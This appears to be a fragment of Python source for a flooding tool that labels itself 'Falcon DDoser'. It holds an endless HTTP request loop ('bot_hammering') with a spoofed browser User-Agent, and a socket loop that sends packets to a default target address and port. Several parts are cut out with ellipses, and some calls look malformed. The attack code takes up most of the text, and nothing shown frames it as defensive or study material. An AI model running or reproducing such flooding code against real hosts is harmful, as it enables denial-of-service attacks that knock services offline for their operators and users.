...
# reading headers
headers = StringIO("Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept: text/html, application/xhtml+xmlAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1Accept-Language: en-us,en;q=0.5Accept-Encoding: gzip,deflateAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7Keep-Alive: 115Connection: keep-alive")
data = headers.read()
headers.close()
...
# main
def run(target='192.168.56.30', door=80):
    host = target
    port = door
...
def bot_hammering(url):
    try:
        while True:
            req = urllib.request.urlopen(url, headers={'User-Agent': "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14"})
    ...
    try:
        while True:
            ...
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                print(Fore.GREEN + time.ctime(time.time()) + Fore.RESET + Fore.BLUE + " <--Packet sended by Falcon DDoser--> " + Fore.RESET)
            else:
                s.shutdown(1)
